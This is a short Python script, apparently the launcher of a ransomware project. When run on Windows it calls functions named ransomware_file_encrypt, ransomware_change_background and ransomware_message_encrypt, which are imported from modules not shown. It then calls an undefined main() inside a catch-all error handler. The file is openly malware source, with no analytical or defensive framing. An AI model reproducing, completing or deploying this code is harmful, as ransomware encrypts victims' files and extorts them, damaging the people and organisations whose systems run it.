#! /usr/bin/env python
#! -*- coding: UTF-8 -*-
import os
import sys

from library.encrypt import *
from library.functions import *

platformsConf = sys.platform
platforms = ['win32', 'win64']
for p in platforms:
    if(p==platformsConf):
        ransomware_file_encrypt()
        ransomware_change_background()
        ransomware_message_encrypt()
    else:
        pass
if __name__ == "__main__":
    try:
        main()
    except:
        print("3RROR!!")
        exit()